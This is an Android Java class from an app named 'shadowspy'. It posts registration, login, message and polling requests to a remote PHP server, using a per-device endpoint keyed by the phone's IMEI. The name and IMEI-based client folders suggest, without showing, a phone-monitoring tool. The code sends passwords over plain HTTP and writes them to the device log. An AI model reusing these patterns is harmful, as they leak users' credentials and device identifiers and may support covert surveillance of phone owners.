package com.example.shadowspy;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;
import org.apache.http.util.EntityUtils;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;


public class Post{
	private String URLregistration = "http://www.shadowspy.besaba.com/registration.php";
	private String URLlogin = "http://www.shadowspy.besaba.com/login.php";	
	private String URLmain = "http://www.shadowspy.besaba.com/clients/";	
	private String URLlogout = "http://www.shadowspy.besaba.com/logout.php";	
	
	
	//-----------------------------------------------------------------
	Post(Context context){
		SharedPreferences pref = context.getSharedPreferences(Codes.file_pref, context.MODE_PRIVATE);
		String IMEI = pref.getString(Codes.saved_IMEI, "00000000000000");
		URLmain += IMEI + "/" + IMEI + ".php";
		Log.v("Send", URLmain);
	}

	
	//-----------------------------------------------------------------
	public String Registration(String login, String pass){
		return SendPost(URLregistration,"@"+StrartActivity.IMEI+"@"+login+"@"+pass);
	}
	
	
	//-----------------------------------------------------------------
	public String Login(String login, String pass){
		Log.w("qqq",URLlogin+ "@"+login+"@"+pass+"@1");
		return SendPost(URLlogin, "@"+login+"@"+pass+"@1");
	}
	
	
	//-----------------------------------------------------------------
	public String Logout(String login, String pass){
		return SendPost(URLlogout, "@"+login+"@"+pass+"@1");
	}
	
	
	//----------------------------------------------------------------
	public String SendMessage(String text){
		return SendPost(URLmain, "0" + text);
	}
	
	
	//----------------------------------------------------------------
	public String RefreshMSG(){
		return SendPost(URLmain, "2");
	}
	
	//------------------------------------------------------------------
    private String SendPost(String dest, String msg){
        try {
        	boolean isOk = false;
	        // Create a new HttpClient and Post Header
	        HttpClient httpclient = new DefaultHttpClient();
	        HttpPost httppost = new HttpPost(dest);        	

	        
            //Добавляем свои данные
            List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);       
            nameValuePairs.add(new BasicNameValuePair("msg", msg));
            httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs, HTTP.UTF_8));
  
            // Выполняем HTTP Post Request
            String text = "#0#0#0";
            HttpResponse response = null;
            try{
            	response = httpclient.execute(httppost);
            	isOk = true;
            }
            catch (Exception e) {
				isOk = false;
			}
            if(isOk) text = EntityUtils.toString(response.getEntity());

            return text;
            
        } catch (ClientProtocolException e) {
        	return "error";
        } catch (IOException e) {
        	return "error";
        }
		  	
    	
    }
    
    
    //---------------------------------------------------
    //обробник повідомлень
	public String[] processMSG(String msg){
		String res[] = new String[20];
		for(int i=0; i<20; i++) res[i] = "0";
		
		if(!msg.equals("error") && !msg.equals("")){	
			res = msg.split("#");	
			for(int i=0; i<res.length; i++)
				res[i] = "#" + res[i];				
		}
		else 
			for(int i=0; i<20; i++) res[i] = "#0";
		
		return res;
	}

    
}
